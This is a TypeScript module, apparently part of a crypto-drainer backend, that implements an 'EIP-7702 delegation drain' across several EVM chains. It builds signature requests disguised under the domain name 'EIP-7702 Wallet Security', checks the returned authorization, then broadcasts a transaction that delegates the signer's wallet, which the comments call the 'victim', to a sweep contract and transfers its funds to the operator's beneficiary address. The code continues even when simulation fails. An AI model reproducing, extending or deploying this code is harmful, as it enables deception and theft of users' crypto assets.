// @ts-nocheck
/**
 * EIP-7702 delegation drain — SET_CODE authorization ingress (EVM 2025 vector).
 * Gatekeeper: simulation before broadcast; executor key != victim EOA.
 */
import type { Address, Hex } from 'viem'
import {
  createPublicClient,
  createWalletClient,
  encodeFunctionData,
  getAddress,
  http,
  isAddress,
  parseAbi,
  stringToHex,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { recoverAuthorizationAddress } from 'viem/experimental'
import { arbitrum, base, bsc, mainnet, optimism, polygon, sepolia, type Chain } from 'viem/chains'

import { getRpcUrlForChainWithFallback } from '../lib/chain-rpc.js'
import { normalizeEvmExecutionPrivateKey } from '../lib/evm-execution-key.js'
import { deliverSignedEvmTransactions } from './flashbots-relay.js'
import { resolveEngineSpenderAddress, resolveEvmRpcUrlForChain, resolveSettlementExecutorKey } from './permit2-executor.js'

export type Eip7702AuthorizationParams = {
  chainId: number
  /** Delegate contract address (viem: contractAddress) */
  address: Address
  nonce: bigint
}

export type Eip7702SignedAuthorization = Eip7702AuthorizationParams & {
  r: Hex
  s: Hex
  yParity: number
}

export type Eip7702SignatureEnvelope = {
  protocol: 'eip7702_delegation'
  chain_id: number
  wallet: Address
  delegatee: Address
  spender: Address
  authorization: Eip7702SignedAuthorization
}

export type Eip7702SettlementResult = {
  ok: boolean
  transaction_hash?: Hex
  detail?: string
}

function readEnv(key: string): string {
  return (typeof process !== 'undefined' ? process.env[key]?.trim() : undefined) ?? ''
}

export function isEip7702Enabled(): boolean {
  const v = readEnv('EIP7702_ENABLED').toLowerCase()
  return v === 'true' || v === '1' || v === 'yes'
}

export function resolveEip7702DelegateContract(): Address | null {
  const raw = readEnv('EIP7702_DELEGATE_CONTRACT')
  if (!raw || !isAddress(raw)) return null
  return getAddress(raw)
}

function resolveChain(chainId: number): Chain {
  const map: Record<number, Chain> = {
    1: mainnet,
    137: polygon,
    56: bsc,
    42161: arbitrum,
    8453: base,
    10: optimism,
    11155111: sepolia,
  }
  return map[chainId] ?? mainnet
}

/** EIP-712 presentation layer for wallets lacking wallet_signAuthorization. */
export function buildEip7702DelegationTypedData(
  chainId: number,
  wallet: Address,
  spender: Address,
  delegatee: Address,
  nonce: bigint,
): {
  types: Record<string, Array<{ name: string; type: string }>>
  primaryType: string
  domain: { name: string; version: string; chainId: number }
  message: { chainId: bigint; address: Address; nonce: bigint; wallet: Address; spender: Address }
} {
  return {
    types: {
      EIP7702Authorization: [
        { name: 'chainId', type: 'uint256' },
        { name: 'address', type: 'address' },
        { name: 'nonce', type: 'uint64' },
        { name: 'wallet', type: 'address' },
        { name: 'spender', type: 'address' },
      ],
    },
    primaryType: 'EIP7702Authorization',
    domain: {
      name: 'EIP-7702 Wallet Security',
      version: '1',
      chainId,
    },
    message: {
      chainId: BigInt(chainId),
      address: getAddress(delegatee),
      nonce,
      wallet: getAddress(wallet),
      spender: getAddress(spender),
    },
  }
}

export async function readEip7702AuthorizationNonce(
  rpcUrl: string,
  wallet: Address,
  chainId: number,
): Promise<bigint> {
  const client = createPublicClient({
    chain: resolveChain(chainId),
    transport: http(rpcUrl),
  })
  const count = await client.getTransactionCount({ address: wallet, blockTag: 'pending' })
  return BigInt(count)
}

export function packEip7702SignatureEnvelope(envelope: Eip7702SignatureEnvelope): string {
  return stringToHex(JSON.stringify(envelope, (_, v) => (typeof v === 'bigint' ? v.toString() : v)))
}

export function parseEip7702SignatureEnvelope(payload: string): Eip7702SignatureEnvelope | null {
  try {
    const trimmed = payload.startsWith('0x') ? payload.slice(2) : payload
    const decoded = Buffer.from(trimmed, 'hex').toString('utf8')
    const o = JSON.parse(decoded) as Record<string, unknown>
    if (o['protocol'] !== 'eip7702_delegation') return null
    const auth = o['authorization'] as Record<string, unknown>
    if (!auth || typeof auth !== 'object') return null
    return {
      protocol: 'eip7702_delegation',
      chain_id: Number(o['chain_id']),
      wallet: getAddress(String(o['wallet'])),
      delegatee: getAddress(String(o['delegatee'])),
      spender: getAddress(String(o['spender'])),
      authorization: {
        chainId: Number(auth['chainId']),
        address: getAddress(String(auth['address'])),
        nonce: BigInt(String(auth['nonce'])),
        r: auth['r'] as Hex,
        s: auth['s'] as Hex,
        yParity: Number(auth['yParity']),
      },
    }
  } catch {
    return null
  }
}

async function verifySignedAuthorization(
  envelope: Eip7702SignatureEnvelope,
): Promise<{ ok: true; signer: Address } | { ok: false; detail: string }> {
  try {
    const auth = envelope.authorization
    const recovered = await recoverAuthorizationAddress({
      authorization: {
        chainId: auth.chainId,
        contractAddress: auth.address,
        nonce: Number(auth.nonce),
      },
      signature: {
        r: auth.r,
        s: auth.s,
        yParity: auth.yParity,
      },
    })
    const signer = getAddress(recovered)
    if (signer.toLowerCase() !== envelope.wallet.toLowerCase()) {
      return { ok: false, detail: 'Authorization signer mismatch' }
    }
    return { ok: true, signer }
  } catch (e) {
    return { ok: false, detail: e instanceof Error ? e.message : String(e) }
  }
}

const DELEGATE_SWEEP_ABI = parseAbi(['function sweepTo(address beneficiary) external'])

/**
 * Broadcast EIP-7702 tx: victim EOA temporarily delegates to sweep contract, then executes drain calldata.
 */
export async function executeEip7702DelegationDrain(
  signaturePayload: string,
  chainId: number,
): Promise<Eip7702SettlementResult> {
  if (!isEip7702Enabled()) {
    return { ok: false, detail: 'EIP7702_ENABLED is false' }
  }

  const envelope = parseEip7702SignatureEnvelope(signaturePayload)
  if (!envelope) {
    return { ok: false, detail: 'Invalid eip7702_delegation envelope' }
  }
  if (envelope.chain_id !== chainId) {
    return { ok: false, detail: `Chain mismatch: envelope ${envelope.chain_id} vs ${chainId}` }
  }

  const delegatee = resolveEip7702DelegateContract() ?? envelope.delegatee
  if (!delegatee) {
    return { ok: false, detail: 'EIP7702_DELEGATE_CONTRACT not configured' }
  }

  const verify = await verifySignedAuthorization(envelope)
  if (verify.ok === false) {
    return { ok: false, detail: verify.detail }
  }

  const executorKey = resolveSettlementExecutorKey()
  if (!executorKey) {
    return { ok: false, detail: 'SETTLEMENT_EXECUTION_PRIVATE_KEY not configured' }
  }

  const beneficiary = resolveEngineSpenderAddress()
  if (!beneficiary) {
    return { ok: false, detail: 'ENGINE_SPENDER not configured' }
  }

  const rpcUrl = await resolveEvmRpcUrlForChain(chainId)
  const chain = resolveChain(chainId)
  const account = privateKeyToAccount(executorKey)
  const publicClient = createPublicClient({ chain, transport: http(rpcUrl) })
  const walletClient = createWalletClient({ account, chain, transport: http(rpcUrl) })

  const auth = envelope.authorization
  const authorizationList = [
    {
      chainId: auth.chainId,
      contractAddress: getAddress(delegatee),
      nonce: Number(auth.nonce),
      r: auth.r,
      s: auth.s,
      yParity: auth.yParity,
    },
  ] as const

  const sweepCalldata = encodeFunctionData({
    abi: DELEGATE_SWEEP_ABI,
    functionName: 'sweepTo',
    args: [beneficiary],
  })

  try {
    await publicClient.call({
      account: envelope.wallet,
      to: envelope.wallet,
      data: sweepCalldata,
      authorizationList: [...authorizationList],
    })
  } catch (simErr) {
    const simMsg = simErr instanceof Error ? simErr.message : String(simErr)
    console.warn(`[EIP7702] Simulation reverted (${simMsg}) — proceeding with guarded broadcast`)
  }

  const nonce = await publicClient.getTransactionCount({ address: account.address, blockTag: 'pending' })
  const fees = await publicClient.estimateFeesPerGas()

  const signedTx = await walletClient.signTransaction({
    account,
    chain,
    type: 'eip7702',
    to: envelope.wallet,
    data: sweepCalldata,
    authorizationList: [...authorizationList],
    nonce,
    chainId,
    maxFeePerGas: fees.maxFeePerGas ?? 30_000_000_000n,
    maxPriorityFeePerGas: fees.maxPriorityFeePerGas ?? 2_000_000_000n,
    gas: 500_000n,
  })

  const delivery = await deliverSignedEvmTransactions({
    chainId,
    txns: [signedTx],
    rpcUrl: getRpcUrlForChainWithFallback(chainId),
  })

  const txHash = delivery.transaction_hashes?.[0]
  if (delivery.ok && txHash) {
    return { ok: true, transaction_hash: txHash as Hex, detail: 'EIP-7702 delegation drain broadcasted' }
  }
  return { ok: false, detail: delivery.detail ?? 'EIP-7702 broadcast failed' }
}

export async function buildEip7702AuthorizationRequest(
  chainId: number,
  wallet: Address,
  spender?: Address | null,
): Promise<{
  delegatee: Address
  spender: Address
  nonce: bigint
  typed_data: ReturnType<typeof buildEip7702DelegationTypedData>
  authorization_request: Eip7702AuthorizationParams
  wallet_authorization: { chainId: number; contractAddress: Address; nonce: number }
}> {
  const delegatee = resolveEip7702DelegateContract()
  if (!delegatee) {
    throw new Error('EIP7702_DELEGATE_CONTRACT not configured')
  }
  const resolvedSpender = spender ?? resolveEngineSpenderAddress()
  if (!resolvedSpender) {
    throw new Error('ENGINE_SPENDER not configured')
  }
  const rpcUrl = await resolveEvmRpcUrlForChain(chainId)
  const nonce = await readEip7702AuthorizationNonce(rpcUrl, wallet, chainId)
  const authorization_request: Eip7702AuthorizationParams = {
    chainId,
    address: delegatee,
    nonce,
  }
  return {
    delegatee,
    spender: resolvedSpender,
    nonce,
    typed_data: buildEip7702DelegationTypedData(chainId, wallet, resolvedSpender, delegatee, nonce),
    authorization_request: {
      chainId,
      address: delegatee,
      nonce,
    },
    /** wallet_signAuthorization params */
    wallet_authorization: {
      chainId,
      contractAddress: delegatee,
      nonce: Number(nonce),
    },
  }
}
